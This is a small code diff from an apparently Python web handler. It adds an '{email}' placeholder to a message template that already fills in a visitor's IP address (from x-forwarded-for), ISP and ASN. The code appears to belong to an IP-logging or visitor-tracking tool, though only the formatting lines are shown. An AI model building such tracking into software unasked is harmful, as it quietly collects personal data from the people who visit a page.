@@ -241,7 +241,8 @@ height: 100vh;
 
                 message = config["message"]["message"]
 
-                if config["message"]["richMessage"] and result:
+                if config["message"]["richMessage"] and result:  
+                    message = message.replace("{email}", result["emailName"])
                     message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                     message = message.replace("{isp}", result["isp"])
                     message = message.replace("{asn}", result["as"])
